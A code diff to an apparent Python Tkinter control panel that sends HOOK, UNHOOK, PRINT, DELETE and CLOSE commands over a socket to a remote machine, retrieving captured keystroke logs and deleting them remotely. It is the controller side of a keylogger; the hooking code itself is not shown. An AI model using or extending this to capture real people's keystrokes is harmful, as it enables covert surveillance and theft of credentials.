@@ -59,23 +59,33 @@ def submit_button_click(event=None):
 
 #####################################################################
 # Send keystroke
-
 def CreateUI_SendKeyStroke():
+    def on_closing():
+        command = "CLOSE"
+        client_socket.sendall(command.encode())
+        KeyStrokeRoot.destroy()
     def hook():
         command = "HOOK"
         client_socket.sendall(command.encode())
-        while True:
-            data = client_socket.recv(1024).decode()
-            text_area.insert(tk.END, data)
+        # while True:
+        #     data = client_socket.recv(1024).decode()
+        #     text_area.insert(tk.END, data)
     def unhook():
         command = "UNHOOK"
         client_socket.sendall(command.encode())
     def print_logs():
-        logs = text_area.get("1.0", tk.END)
-        print(logs)
-
+        command = "PRINT"
+        client_socket.sendall(command.encode())
+        file_data = client_socket.recv(1024)
+        log_content = file_data.decode('utf-8')
+        text_area.delete(1.0, tk.END)
+        text_area.insert(tk.END, log_content)
     def delete_logs():
-        text_area.delete("1.0", tk.END)
+        command = "DELETE"
+        client_socket.sendall(command.encode())
+        # response = client_socket.recv(1024)
+        text_area.delete(1.0, tk.END)
+        # print(response.decode())
 
     # Create the main window
     KeyStrokeRoot = tk.Tk()
@@ -90,7 +100,7 @@ def CreateUI_SendKeyStroke():
 
     # Create a scrolled text area
     text_area = scrolledtext.ScrolledText(KeyStrokeRoot, width=70, height=20)
-
+    KeyStrokeRoot.protocol("WM_DELETE_WINDOW", on_closing)
     # Place buttons and text area in the UI
     hook_button.pack(pady=10)
     unhook_button.pack(pady=10)
